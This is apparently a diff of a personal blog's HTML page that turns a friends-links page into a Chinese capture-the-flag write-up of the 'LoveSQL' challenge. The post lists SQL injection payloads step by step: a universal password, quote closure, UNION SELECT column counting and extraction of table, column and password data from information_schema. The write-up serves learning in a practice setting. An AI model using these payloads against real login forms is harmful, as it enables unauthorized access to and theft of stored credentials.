@@ -2,10 +2,9 @@
 <html>
 
 <head>
-    
-                <meta charset="utf-8" />
+    <meta charset="utf-8" />
 <title>
-    Friends | Ro1ing
+    Ro1ing
 </title>
 <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
@@ -46,7 +45,6 @@
                                 })();
                             </script>
                             
-                    
 </head>
 
 <body>
@@ -162,34 +160,172 @@
                 <div class="container">
                     <article class="post-wrap">
                         <header class="post-header">
-                            <h1 class="post-title zh">
-                                &#x53CB;&#x94FE;
+                            <h1 class="post-title">
+                                [极客大挑战 2019]LoveSQL
                             </h1>
-                            <h1 class="post-title en">
-                                Friends
-                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        Ro1ing
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-01-30</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.5
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">366</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://Ro1ing.github.io/tag/zrXv1HrkU/">SQL</a>
+                                
+                                <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">CTF</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
                         </header>
+                        
                         <div class="post-content">
+                            <p>用户登录界面</p>
+<blockquote>
+<p>尝试使用万能密码</p>
+<pre><code>admin/1'or'1'='1
+</code></pre>
+</blockquote>
+<p>测试单引号' 观察是否有报错信息<br>
+这里我就可以知道为 <strong>字符型注入</strong><br>
+如果是<strong>整形</strong> 报错信息为“12’”<br>
+所以我们要使用到闭合语句来完成</p>
+<p>字符型和数字型最大的一个区别在于，数字型<u>不需要单引号来闭合</u>，而字符串<u>一般需要通过单引号来闭合的</u>。</p>
+<p>这里使用 <strong>%23</strong> 来闭合</p>
+<blockquote>
+<p>不知道这里为什么 <u>#</u>  <em>--+</em> 不行</p>
+</blockquote>
+<p>payload：</p>
+<blockquote>
+<p>?username=1&amp;password=12' %23<br>
+没有报错有回显 NO</p>
+</blockquote>
+<p>尝试联合注入</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1%23<br>
+回显<br>
+The used sELECT statements have a different number of columns<br>
+提示了我们后面有更多的列数</p>
+</blockquote>
+<p>添加更多的列</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1,2,3%23</p>
+</blockquote>
+<p>查询当前数据库名字</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1,database(),3%23</p>
+</blockquote>
+<p>发现库名geek<br>
+在2字段使用group_concat()无效<br>
+查询一下3字段</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1, 2, group_concat(table_name)from information_schema.tables where table_schema='geek' %23</p>
+</blockquote>
+<p>看到<u>geek</u>里面有两个表 再查列</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23<br>
+?username=1&amp;password=12' union select 1, 2,<br>
+group_concat(password) from lovelysq1 %23</p>
+</blockquote>
+<p>得到flag<br>
+知识点:<br>
+<strong>字符型注入</strong><br>
+字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                
+                            </div>
                             
                                 
-                                    <div class="friend-box">
-                                        <img class="friend-avatar" src="https://blog.itjoker.cn/images/avatar.png">
-                                        <div class="flink-info">
-                                            <a href="https://blog.itjoker.cn" target="_blank">
-                                                ITJoker
-                                            </a>
-                                            <br />
-                                            ITJoker&#39;s Blog
-                                        </div>
-                                    </div>
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>Ro1ing</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/">https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                        </div>
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/&sharesource=qzone&title=[极客大挑战 2019]LoveSQL&pics=https://Ro1ing.github.io/images/avatar.png?v=1611987745664&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/&sharesource=weibo&title=[极客大挑战 2019]LoveSQL + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1611987745664 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://Ro1ing.github.io/tag/zrXv1HrkU/">#
+                                                SQL
+                                                    </a>
+                                                    
+                        <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">#
+                                                CTF
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/">
+                                                                                            [护网杯2018]easy_tornado
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/buuctf-web/">
+                                                                                                     [ZJCTF 2019]NiZhuanSiWei
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
                     </article>
                 </div>
+                
+                                            
             </div>
-            
-                                        
+    </div>
+    </div>
     </div>
     
     <div id="player"></div>
@@ -270,6 +406,10 @@
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
+        </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
